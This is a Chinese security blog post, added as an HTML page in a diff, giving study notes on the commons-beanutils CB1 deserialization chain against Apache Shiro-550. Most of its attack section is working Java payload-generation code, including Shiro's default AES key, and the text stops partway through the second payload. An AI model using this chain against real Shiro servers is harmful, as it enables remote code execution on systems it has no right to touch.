@@ -1,0 +1,765 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
+  <link rel="icon" href="/img/fluid.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="rightevil">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="在shiro-550中，是没有CC库的，上篇中的demo是为了方便展示加上去的，当去掉cc库之后，我们该怎么去打？然后这个时候就翻到了shiro自带的一个依赖库：commons-beanutils库。在说这个库之前，我们先了解一下Java中的一个规范：JavaBean（普通Java类对象） JavaBean：如果有一个类的私有属性叫k，那就有一个读取和设置这个属性的方法，称为getter和sett">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Java安全漫谈学习笔记9-CB1链">
+<meta property="og:url" content="https://rightevil.github.io/Java%E5%AE%89%E5%85%A8%E6%BC%AB%E8%B0%88%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B09-CB1%E9%93%BE/index.html">
+<meta property="og:site_name" content="rightevil">
+<meta property="og:description" content="在shiro-550中，是没有CC库的，上篇中的demo是为了方便展示加上去的，当去掉cc库之后，我们该怎么去打？然后这个时候就翻到了shiro自带的一个依赖库：commons-beanutils库。在说这个库之前，我们先了解一下Java中的一个规范：JavaBean（普通Java类对象） JavaBean：如果有一个类的私有属性叫k，那就有一个读取和设置这个属性的方法，称为getter和sett">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://origin.picgo.net/2026/05/04/1777878313745-a597b46f-1b98-4b7b-a37d-d6f523b278b204ff6ba9587fe107.png">
+<meta property="og:image" content="https://origin.picgo.net/2026/05/04/1777878846579-9246b68b-8828-4e24-aeb3-db799b31c680fdffc04f417768d8.png">
+<meta property="og:image" content="https://origin.picgo.net/2026/05/04/1777879327526-57deb5d8-7faf-49cd-a9bd-5d83c1a396df98d37a454ea2fca4.png">
+<meta property="og:image" content="https://origin.picgo.net/2026/05/04/1777880129430-ebbf83a3-cf3b-4778-87ec-b314238fc4351c5c66c9f081d354.png">
+<meta property="article:published_time" content="2026-05-04T07:42:04.000Z">
+<meta property="article:modified_time" content="2026-05-04T07:48:02.914Z">
+<meta property="article:author" content="rightevil">
+<meta property="article:tag" content="javasec">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://origin.picgo.net/2026/05/04/1777878313745-a597b46f-1b98-4b7b-a37d-d6f523b278b204ff6ba9587fe107.png">
+  
+  
+    <meta name="referrer" content="no-referrer-when-downgrade">
+  
+  
+  <title>Java安全漫谈学习笔记9-CB1链 - rightevil</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"rightevil.github.io","root":"/","version":"1.9.3","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":true,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"follow_dnt":true,"baidu":null,"google":"UA-285611083-1","gtag":"G-TKYW22HREX","tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml"};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+  
+
+  
+    <!-- Google Analytics -->
+    <script async>
+      if (!Fluid.ctx.dnt) {
+        Fluid.utils.createScript('https://www.google-analytics.com/analytics.js', function() {
+          window.ga = window.ga || function() { (ga.q = ga.q || []).push(arguments) };
+          ga.l = +new Date;
+          ga('create', 'UA-285611083-1', 'auto');
+          ga('send', 'pageview');
+        });
+      }
+    </script>
+  
+
+  
+    <!-- Google gtag.js -->
+    <script async>
+      if (!Fluid.ctx.dnt) {
+        Fluid.utils.createScript('https://www.googletagmanager.com/gtag/js?id=G-TKYW22HREX', function() {
+          window.dataLayer = window.dataLayer || [];
+          function gtag(){dataLayer.push(arguments);}
+          gtag('js', new Date());
+          gtag('config', 'G-TKYW22HREX');
+        });
+      }
+    </script>
+  
+
+  
+
+  
+
+  
+
+  
+
+
+
+  
+<!-- hexo injector head_end start -->
+    <div id="fb-root"></div>
+    <script async defer crossorigin="anonymous" src="https://connect.facebook.net/zh_TW/sdk.js#xfbml=1&version=v12.0"></script>
+  <!-- hexo injector head_end end --><meta name="generator" content="Hexo 5.4.2"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>嘿阔乐园</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                首页
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                归档
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                分类
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                标签
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                关于
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/links/">
+                <i class="iconfont icon-link-fill"></i>
+                好友blog
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              &nbsp;<i class="iconfont icon-search"></i>&nbsp;
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="Java安全漫谈学习笔记9-CB1链"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2026-05-04 15:42" pubdate>
+          2026年5月4日 下午
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          <!-- compatible with older versions-->
+          7.2k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          <!-- compatible with older versions-->
+          61 分钟
+        
+      </span>
+    
+
+    
+    
+      
+        <span id="busuanzi_container_page_pv" style="display: none">
+          <i class="iconfont icon-eye" aria-hidden="true"></i>
+          <span id="busuanzi_value_page_pv"></span> 次
+        </span>
+        
+      
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">Java安全漫谈学习笔记9-CB1链</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <p>在shiro-550中，是没有CC库的，上篇中的demo是为了方便展示加上去的，当去掉cc库之后，我们该怎么去打？然后这个时候就翻到了shiro自带的一个依赖库：<code>commons-beanutils</code>库。在说这个库之前，我们先了解一下Java中的一个规范：<code>JavaBean</code>（普通Java类对象）</p>
+<p>JavaBean：如果有一个类的私有属性叫k，那就有一个读取和设置这个属性的方法，称为getter和setter，比如getK，setK。</p>
+<p>简单了解了这个规范之后再来了解这个cb库，这个cb库有一个静态方法<code>PropertyUtils.getProperty</code>，可以通过这个方法直接调用上面说的getter方法，</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">PropertyUtils.getProperty(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Cat</span>(),<span class="hljs-string">&quot;k&quot;</span>);<br></code></pre></td></tr></table></figure>
+
+<p>这里会自动找到上面的getK方法，然后调用，获取返回值。同时，这个方法还支持递归获取，比如</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">PropertyUtils.getProperty(a,<span class="hljs-string">&quot;b.c&quot;</span>);<br></code></pre></td></tr></table></figure>
+
+<p>然后上一节我们用的是PriorityQueue里的Comparator接口，那这里能不能也找到一个这样的接口，是有的，叫做<code>org.apache.commons.beanutils.BeanComparator</code>。它的compare方法的底层逻辑是这样的：<code>你给我俩个对象和一个属性名，我去自动调用这俩个对象的getter方法获取这个属性值，然后比较大小</code>。</p>
+<p>而恰好之前学习字节码，TemplatesImpl中除了<code>newTransformer</code>能触发，还有一个<code>getOutputProperties</code> 也可以触发，这个正好就是getter。</p>
+<p>利用链为：</p>
+<p>PriorityQueue.readObject (优先队列排序) -&gt; BeanComparator.compare (比较器提取属性) -&gt; TemplatesImpl.getOutputProperties (自动调 Getter) -&gt; <strong>代码执行！</strong></p>
+<p>利用payload如下</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;<br><span class="hljs-keyword">import</span> javassist.ClassPool;<br><span class="hljs-keyword">import</span> org.apache.commons.beanutils.BeanComparator;<br><span class="hljs-keyword">import</span> org.apache.shiro.crypto.AesCipherService;<br><span class="hljs-keyword">import</span> org.apache.shiro.util.ByteSource;<br><span class="hljs-keyword">import</span> java.io.ByteArrayInputStream;<br><span class="hljs-keyword">import</span> java.io.ByteArrayOutputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectInputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectOutputStream;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.util.*;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CB1</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-type">void</span> <span class="hljs-title function_">setValue</span><span class="hljs-params">(Object obj, String field,Object value)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">f</span> <span class="hljs-operator">=</span> obj.getClass().getDeclaredField(field);<br>        f.setAccessible(<span class="hljs-literal">true</span>);<br>        f.set(obj, value);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-type">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">byte</span>[] <span class="hljs-variable">code</span><span class="hljs-operator">=</span> Base64.getDecoder().decode(<span class="hljs-string">&quot;yv66vgAAADQAIQoABgASCQATABQIABUKABYAFwcAGAcAGQEACXRyYW5zZm9ybQEAcihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRj&quot;</span> +<br>                <span class="hljs-string">&quot;L0RPTTtbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYW&quot;</span> +<br>                <span class="hljs-string">&quot;xpemF0aW9uSGFuZGxlcjspVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBAApFeGNlcHRpb25z&quot;</span> +<br>                <span class="hljs-string">&quot;BwAaAQCmKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO0xjb2&quot;</span> +<br>                <span class="hljs-string">&quot;0vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7TGNvbS9z&quot;</span> +<br>                <span class="hljs-string">&quot;dW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZG&quot;</span> +<br>                <span class="hljs-string">&quot;xlcjspVgEABjxpbml0PgEAAygpVgEAClNvdXJjZUZpbGUBABdIZWxsb1RlbXBsYXRlc0ltcGwu&quot;</span> +<br>                <span class="hljs-string">&quot;amF2YQwADgAPBwAbDAAcAB0BABNIZWxsbyBUZW1wbGF0ZXNJbXBsBwAeDAAfACABABJIZWxsb1&quot;</span> +<br>                <span class="hljs-string">&quot;RlbXBsYXRlc0ltcGwBAEBjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMv&quot;</span> +<br>                <span class="hljs-string">&quot;cnVudGltZS9BYnN0cmFjdFRyYW5zbGV0AQA5Y29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludG&quot;</span> +<br>                <span class="hljs-string">&quot;VybmFsL3hzbHRjL1RyYW5zbGV0RXhjZXB0aW9uAQAQamF2YS9sYW5nL1N5c3RlbQEAA291dAEA&quot;</span> +<br>                <span class="hljs-string">&quot;FUxqYXZhL2lvL1ByaW50U3RyZWFtOwEAE2phdmEvaW8vUHJpbnRTdHJlYW0BAAdwcmludGxuAQ&quot;</span> +<br>                <span class="hljs-string">&quot;AVKExqYXZhL2xhbmcvU3RyaW5nOylWACEABQAGAAAAAAADAAEABwAIAAIACQAAABkAAAADAAAA&quot;</span> +<br>                <span class="hljs-string">&quot;AbEAAAABAAoAAAAGAAEAAAAIAAsAAAAEAAEADAABAAcADQACAAkAAAAZAAAABAAAAAGxAAAAAQ&quot;</span> +<br>                <span class="hljs-string">&quot;AKAAAABgABAAAACgALAAAABAABAAwAAQAOAA8AAQAJAAAALQACAAEAAAANKrcAAbIAAhIDtgAE&quot;</span> +<br>                <span class="hljs-string">&quot;sQAAAAEACgAAAA4AAwAAAA0ABAAOAAwADwABABAAAAACABE=&quot;</span>);<br>        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();<br>        setValue(obj,<span class="hljs-string">&quot;_bytecodes&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[][]&#123;ClassPool.getDefault().get(Co.class.getName()).toBytecode()&#125;);<br>        setValue(obj,<span class="hljs-string">&quot;_name&quot;</span>,<span class="hljs-string">&quot;gYppSHXH&quot;</span>);<br>        setValue(obj,<span class="hljs-string">&quot;_tfactory&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerFactoryImpl</span>());<br>        <span class="hljs-type">BeanComparator</span> <span class="hljs-variable">comparator</span><span class="hljs-operator">=</span><span class="hljs-keyword">new</span> <span class="hljs-title class_">BeanComparator</span>();<br>        <span class="hljs-type">PriorityQueue</span> <span class="hljs-variable">queue</span><span class="hljs-operator">=</span><span class="hljs-keyword">new</span> <span class="hljs-title class_">PriorityQueue</span>(<span class="hljs-number">2</span>,comparator);<br><br>        queue.add(<span class="hljs-number">1</span>);<br>        queue.add(<span class="hljs-number">1</span>);<br><br>        setValue(comparator,<span class="hljs-string">&quot;property&quot;</span>,<span class="hljs-string">&quot;outputProperties&quot;</span>);<br>        setValue(queue,<span class="hljs-string">&quot;queue&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;obj,obj&#125;);<br>        <span class="hljs-comment">// 1. 序列化 (生成恶意二进制流)</span><br>        <span class="hljs-comment">// 1. 创建一个字节数组输出流（容器）</span><br>        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">barr</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>        <span class="hljs-comment">// 2. 创建一个对象输出流（工人），并告诉它把数据写到上面的容器里</span><br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(barr);<br>        <span class="hljs-comment">// 3. 工人开始干活：把对象冻结（序列化）并写入容器</span><br>        oos.writeObject(queue);<br>        <span class="hljs-comment">// 4. 关闭流（好习惯）</span><br>        oos.close();<br><br>        System.out.println(<span class="hljs-string">&quot;Payload 生成成功，长度: &quot;</span> + barr.size() + <span class="hljs-string">&quot; 字节&quot;</span>);<br>        System.out.println(<span class="hljs-string">&quot;Base64 编码后的序列化数据：&quot;</span>);<br>        <span class="hljs-type">AesCipherService</span> <span class="hljs-variable">aes</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">AesCipherService</span>();<br>        <span class="hljs-type">byte</span>[] <span class="hljs-variable">key</span> <span class="hljs-operator">=</span> java.util.Base64.getDecoder().decode(<span class="hljs-string">&quot;kPH+bIxk5D2deZiIxcaaaA==&quot;</span>);<br><br>        <span class="hljs-type">ByteSource</span> <span class="hljs-variable">ciphertext</span> <span class="hljs-operator">=</span> aes.encrypt(barr.toByteArray(), key);<br>        System.out.printf(ciphertext.toString());<br>        <span class="hljs-comment">// 2. 反序列化 (模拟服务端接收并解析)</span><br>        <span class="hljs-comment">// 这一行代码执行时，计算器就会弹出！</span><br>        System.out.println(<span class="hljs-string">&quot;开始反序列化...&quot;</span>);<br>        <span class="hljs-type">ByteArrayInputStream</span> <span class="hljs-variable">bais</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayInputStream</span>(barr.toByteArray());<br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(bais);<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> (Object)ois.readObject();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>当我们用这个payload生成的数据发包时，失败了，tomcat输出<br><img src="https://origin.picgo.net/2026/05/04/1777878313745-a597b46f-1b98-4b7b-a37d-d6f523b278b204ff6ba9587fe107.png" srcset="/img/loading.gif" lazyload></p>
+<p>这是因为序列化是有版本号验证的，我们生成payload用的cb库和shiro服务器自带的库版本号不一致，这个也很好解决，把本地依赖版本号改一下就行了，改完了之后结果还是有问题</p>
+<p><img src="https://origin.picgo.net/2026/05/04/1777878846579-9246b68b-8828-4e24-aeb3-db799b31c680fdffc04f417768d8.png" srcset="/img/loading.gif" lazyload></p>
+<p>这是因为BeanComparator构造时如果不传第三个参数，他会默认借用cc库里的ComparableComparator来做底层对比，而shiro没有完整的cc库，这就导致服务端在初始化时崩溃。<br><img src="https://origin.picgo.net/2026/05/04/1777879327526-57deb5d8-7faf-49cd-a9bd-5d83c1a396df98d37a454ea2fca4.png" srcset="/img/loading.gif" lazyload></p>
+<p>那我们就想办法找这么一个类，它：</p>
+<ul>
+<li>有<code>java.util.Comparator</code>接口</li>
+<li>有<code>java.io.Serializable</code>接口</li>
+<li>Java，shiro或者cb库自带，兼容性好</li>
+</ul>
+<p>然后就找到了<code>CaseInsensitiveComparator</code>，它是<code>java.lang.String</code>下的一个内部私有类，属于是java的核心代码。这个类就是平时用来做字符串忽略大小写比较的，那现在用这个作为参数就可以了。</p>
+<p>改了之后成功弹出计算器</p>
+<p><img src="https://origin.picgo.net/2026/05/04/1777880129430-ebbf83a3-cf3b-4778-87ec-b314238fc4351c5c66c9f081d354.png" srcset="/img/loading.gif" lazyload></p>
+<p>然后注意queue.add的时候要把1改成字符串<code>&quot;1&quot;</code></p>
+<p>payload如下</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;<br><span class="hljs-keyword">import</span> javassist.ClassPool;<br><span class="hljs-keyword">import</span> org.apache.commons.beanutils.BeanComparator;<br><span class="hljs-keyword">import</span> org.apache.shiro.crypto.AesCipherService;<br><span class="hljs-keyword">import</span> org.apache.shiro.util.ByteSource;<br><span class="hljs-keyword">import</span> java.io.ByteArrayInputStream;<br><span class="hljs-keyword">import</span> java.io.ByteArrayOutputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectInputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectOutputStream;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.util.*;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CB1</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-type">void</span> <span class="hljs-title function_">setValue</span><span class="hljs-params">(Object obj, String field,Object value)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">f</span> <span class="hljs-operator">=</span> obj.getClass().getDeclaredField(field);<br>        f.setAccessible(<span class="hljs-literal">true</span>);<br>        f.set(obj, value);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-type">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();<br>        setValue(obj,<span class="hljs-string">&quot;_bytecodes&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[][]&#123;ClassPool.getDefault().get(Co.class.getName()).toBytecode()&#125;);<br>        setValue(obj,<span class="hljs-string">&quot;_name&quot;</span>,<span class="hljs-string">&quot;gYppSHXH&quot;</span>);<br>        setValue(obj,<span class="hljs-string">&quot;_tfactory&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerFactoryImpl</span>());<br>        <span class="hljs-type">BeanComparator</span> <span class="hljs-variable">comparator</span><span class="hljs-operator">=</span><span class="hljs-keyword">new</span> <span class="hljs-title class_">BeanComparator</span>(<span class="hljs-literal">null</span>,String.CASE_INSENSITIVE_ORDER);<br>        <span class="hljs-type">PriorityQueue</span> <span class="hljs-variable">queue</span><span class="hljs-operator">=</span><span class="hljs-keyword">new</span> <span class="hljs-title class_">PriorityQueue</span>(<span class="hljs-number">2</span>,comparator);<br><br>        queue.add(<span class="hljs-string">&quot;1&quot;</span>);<br>        queue.add(<span class="hljs-string">&quot;1&quot;</span>);<br><br>        setValue(comparator,<span class="hljs-string">&quot;property&quot;</span>,<span class="hljs-string">&quot;outputProperties&quot;</span>);<br>        setValue(queue,<span class="hljs-string">&quot;queue&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;obj,obj&#125;);<br>        <span class="hljs-comment">// 1. 序列化 (生成恶意二进制流)</span><br>        <span class="hljs-comment">// 1. 创建一个字节数组输出流（容器）</span><br>        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">barr</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>        <span class="hljs-comment">// 2. 创建一个对象输出流（工人），并告诉它把数据写到上面的容器里</span><br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> 